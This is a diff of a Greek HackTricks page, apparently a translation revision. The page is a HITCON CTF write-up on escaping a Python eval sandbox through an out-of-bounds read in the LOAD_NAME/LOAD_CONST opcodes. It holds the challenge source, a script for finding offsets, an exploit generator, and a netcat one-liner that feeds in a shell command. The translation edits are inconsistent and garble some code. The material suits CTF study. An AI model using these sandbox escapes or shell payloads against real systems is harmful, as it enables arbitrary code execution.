@@ -1,29 +1,29 @@
-# LOAD_NAME / LOAD_CONST opcode OOB Read
+# LOAD\_NAME / LOAD\_CONST opcode OOB Read
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστηρίξτε το HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Αυτές οι πληροφορίες προήχθησαν** [**από αυτήν την ανάλυση**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
+**Αυτές οι πληροφορίες ελήφθησαν** [**από αυτήν την ανάρτηση**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Μπορούμε να χρησιμοποιήσουμε το χαρακτηριστικό OOB read στον κώδικα LOAD_NAME / LOAD_CONST opcode για να ανακτήσουμε κάποιο σύμβολο από τη μνήμη. Αυτό σημαίνει χρήση κόλπου όπως `(a, b, c, ... εκατοντάδες σύμβολα ..., __getattribute__) if [] else [].__getattribute__(...)` για να ανακτήσετε ένα σύμβολο (όπως το όνομα μιας συνάρτησης) που θέλετε.
+Μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB read στο LOAD\_NAME / LOAD\_CONST opcode για να αποκτήσουμε κάποιο σύμβολο στη μνήμη. Αυτό σημαίνει ότι χρησιμοποιούμε κόλπα όπως `(a, b, c, ... εκατοντάδες σύμβολα ..., __getattribute__) if [] else [].__getattribute__(...)` για να αποκτήσουμε ένα σύμβολο (όπως το όνομα μιας συνάρτησης) που θέλουμε.
 
-Στη συνέχεια απλά δημιουργήστε την εκμετάλλευσή σας.
+Στη συνέχεια, απλά κατασκευάζετε την εκμετάλλευσή σας.
 
-### Επισκόπηση <a href="#overview-1" id="overview-1"></a>
+### Overview <a href="#overview-1" id="overview-1"></a>
 
 Ο πηγαίος κώδικας είναι αρκετά σύντομος, περιέχει μόνο 4 γραμμές!
 ```python
@@ -32,11 +32,15 @@ if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-### Ανάγνωση εκτός ορίων <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+Μπορείτε να εισάγετε αυθαίρεο Python κώδικα, και θα μετατραπεί σε ένα [Python code object](https://docs.python.org/3/c-api/code.html). Ωστόσο, το `co_consts` και το `co_names` αυτού του code object θα αντικατασταθούν με ένα κενό tuple πριν την εκτέλεση αυτού του code object.
 
-Πώς συμβαίνει το σφάλμα σεγμεντέισον;
+Έτσι, με αυτόν τον τρόπο, όλες οι εκφράσεις που περιέχουν σταθερές (π.χ. αριθμούς, συμβολοσειρές κ.λπ.) ή ονόματα (π.χ. μεταβλητές, συναρτήσεις) μπορεί να προκαλέσουν σφάλμα τμηματοποίησης στο τέλος.
 
-Ας ξεκινήσουμε με ένα απλό παράδειγμα, `[a, b, c]` μπορεί να μεταγλωττιστεί στον ακόλουθο κώδικα bytecode.
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+
+Πώς συμβαίνει το segfault;
+
+Ας ξεκινήσουμε με ένα απλό παράδειγμα, `[a, b, c]` θα μπορούσε να μετατραπεί στον παρακάτω bytecode.
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -44,11 +48,11 @@ print(eval(code, {'__builtins__': {}}))1234
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Αλλά τι συμβαίνει αν τα `co_names` γίνουν ένα κενό tuple; Το `LOAD_NAME 2` opcode εξακολουθεί να εκτελείται και προσπαθεί να διαβάσει την τιμή από αυτήν τη διεύθυνση μνήμης που αρχικά έπρεπε να είναι. Ναι, αυτό είναι ένα χαρακτηριστικό εκτός ορίων ανάγνωσης.
+Αλλά τι γίνεται αν το `co_names` γίνει κενό tuple; Ο opcode `LOAD_NAME 2` εκτελείται ακόμα και προσπαθεί να διαβάσει την τιμή από τη μνήμη που αρχικά θα έπρεπε να είναι. Ναι, αυτό είναι ένα χαρακτηριστικό "out-of-bound read".
 
-Το βασικό συναίσθημα για τη λύση είναι απλό. Κάποια opcodes στο CPython, για παράδειγμα το `LOAD_NAME` και το `LOAD_CONST`, είναι ευάλωτα (?) στην OOB ανάγνωση.
+Η βασική έννοια για τη λύση είναι απλή. Ορισμένοι opcodes στην CPython, για παράδειγμα `LOAD_NAME` και `LOAD_CONST`, είναι ευάλωτοι (?) σε OOB read.
 
-Ανακτούν ένα αντικείμενο από το δείκτη `oparg` από το tuple `consts` ή `names` (αυτό που ονομάζεται `co_consts` και `co_names` κάτω από το καπάκι). Μπορούμε να αναφερθούμε στο ακόλουθο σύντομο απόσπασμα σχετικά με το `LOAD_CONST` για να δούμε τι κάνει το CPython όταν επεξεργάζεται το `LOAD_CONST` opcode.
+Ανακτούν ένα αντικείμενο από τον δείκτη `oparg` από το tuple `consts` ή `names` (αυτό είναι που ονομάζονται `co_consts` και `co_names` κάτω από την επιφάνεια). Μπορούμε να αναφερθούμε στο παρακάτω σύντομο απόσπασμα σχετικά με το `LOAD_CONST` για να δούμε τι κάνει η CPython όταν επεξεργάζεται τον opcode `LOAD_CONST`.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -58,21 +62,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε το χαρακτηριστικό OOB για να λάβουμε ένα "όνομα" από αυθαίρετη μνήμη. Για να βεβαιωθούμε για το όνομα που έχει και το offset του, απλά συνεχίστε να δοκιμάζετε `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και θα μπορούσατε να βρείτε κάτι γύρω από oparg > 700. Μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε το gdb για να ρίξετε μια ματιά στη διάταξη της μνήμης φυσικά, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο;
+Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB για να αποκτήσουμε ένα "όνομα" από αυθαίρετη διεύθυνση μνήμης. Για να βεβαιωθούμε ποιο όνομα έχει και ποια είναι η διεύθυνσή του, απλώς συνεχίστε να δοκιμάζετε `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και θα μπορούσατε να βρείτε κάτι σε περίπου oparg > 700. Μπορείτε επίσης να προσπαθήσετε να χρησιμοποιήσετε το gdb για να ρίξετε μια ματιά στη διάταξη μνήμης φυσικά, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο;
 
-### Δημιουργία του Εκμεταλλευτή <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Αφού ανακτήσουμε αυτά τα χρήσιμα offsets για ονόματα / σταθερές, πώς _μπορούμε_ να λάβουμε ένα όνομα / σταθερά από αυτό το offset και να το χρησιμοποιήσουμε; Εδώ υπάρχει ένα κόλπο για εσάς:\
-Ας υποθέσουμε ότι μπορούμε να λάβουμε ένα όνομα `__getattribute__` από το offset 5 (`LOAD_NAME 5`) με `co_names=()`, τότε απλά κάντε τα ακόλουθα:
+Μόλις ανακτήσουμε αυτές τις χρήσιμες διευθύνσεις για ονόματα / σταθερές, πώς _ακριβώς_ αποκτούμε ένα όνομα / σταθερά από αυτή τη διεύθυνση και το χρησιμοποιούμε; Εδώ είναι ένα κόλπο για εσάς:\
+Ας υποθέσουμε ότι μπορούμε να αποκτήσουμε ένα όνομα `__getattribute__` από τη διεύθυνση 5 (`LOAD_NAME 5`) με `co_names=()`, τότε απλώς κάντε τα εξής:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Σημείωσε ότι δεν είναι απαραίτητο να το ονομάσεις `__getattribute__`, μπορείς να το ονομάσεις κάτι πιο σύντομο ή πιο παράξενο
+> Παρατηρήστε ότι δεν είναι απαραίτητο να το ονομάσετε ως `__getattribute__`, μπορείτε να το ονομάσετε με κάτι πιο σύντομο ή πιο περίεργο
 
-Μπορείς να καταλάβεις τον λόγο απλά βλέποντας το bytecode του:
+Μπορείτε να κατανοήσετε τον λόγο πίσω από αυτό απλά βλέποντας τον bytecode του:
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -89,20 +93,20 @@ FAST_DISPATCH();
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Σημειώστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Το Python φορτώνει ονόματα από την ίδια θέση εάν το όνομα είναι το ίδιο, έτσι το δεύτερο `__getattribute__` φορτώνεται ακόμα από τη θέση offset=5. Χρησιμοποιώντας αυτό το χαρακτηριστικό μπορούμε να χρησιμοποιήσουμε το όνομα που θέλουμε μια φορά που το όνομα βρίσκεται στη μνήμη κοντά.
+Σημειώστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Η Python φορτώνει ονόματα από την ίδια θέση αν το όνομα είναι το ίδιο, οπότε το δεύτερο `__getattribute__` φορτώνεται ακόμα από offset=5. Χρησιμοποιώντας αυτή τη δυνατότητα, μπορούμε να χρησιμοποιήσουμε οποιοδήποτε όνομα μόλις το όνομα είναι στη μνήμη κοντά.
 
-Για τη δημιουργία αριθμών θα πρέπει να είναι ασήμαντο:
+Για τη δημιουργία αριθμών θα πρέπει να είναι απλό:
 
-* 0: not \[\[]]
-* 1: not \[]
-* 2: (not \[]) + (not \[])
+* 0: όχι \[\[]]
+* 1: όχι \[]
+* 2: (όχι \[]) + (όχι \[])
 * ...
 
-### Σενάριο Εκμετάλλευσης <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Δεν χρησιμοποίησα σταθερές λόγω του όριου μήκους.
+Δεν χρησιμοποίησα consts λόγω του περιορισμού μήκους.
 
-Πρώτα εδώ υπάρχει ένα σενάριο για εμάς για να βρούμε αυτές τις θέσεις των ονομάτων.
+Πρώτα εδώ είναι ένα σενάριο για να βρούμε αυτά τα offsets των ονομάτων.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -137,7 +141,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-Και το παρακάτω είναι για τη δημιουργία του πραγματικού εκμεταλλεύματος Python.
+Και το παρακάτω είναι για τη δημιουργία του πραγματικού εκμεταλλευτή Python.
 ```python
 import sys
 import unicodedata
@@ -214,7 +218,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Βασικά κάνει τα ακόλουθα πράγματα, για εκείνες τις συμβολοσειρές που τις λαμβάνουμε από τη μέθοδο `__dir__`:
+Βασικά εκτελεί τα εξής πράγματα, για αυτές τις συμβολοσειρές τις αποκτούμε από τη μέθοδο `__dir__`:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -228,16 +232,16 @@ getattr(
 builtins['eval'](builtins['input']())
 ```
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Υποστηρίξτε το HackTricks</summary>
 
 * Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Συμμετέχετε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Κοινοποιήστε τεχνικές χάκινγκ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
